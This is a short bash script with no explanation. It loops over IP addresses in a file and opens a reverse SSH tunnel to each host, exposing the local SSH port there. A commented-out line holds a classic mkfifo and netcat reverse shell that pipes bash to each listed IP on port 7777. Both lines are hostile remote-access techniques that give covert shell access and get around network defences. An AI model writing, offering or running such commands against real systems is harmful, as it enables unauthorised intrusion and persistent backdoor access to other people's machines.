#!/usr/local/bin/bash
for ip in $(cat ip.txt);
do

ssh -R 10009:localhost:22 nixpal@$ip -p 1010
#mkfifo nixpal && nc $ip 7777 <nixpal | /usr/local/bin/bash &>nixpal

done

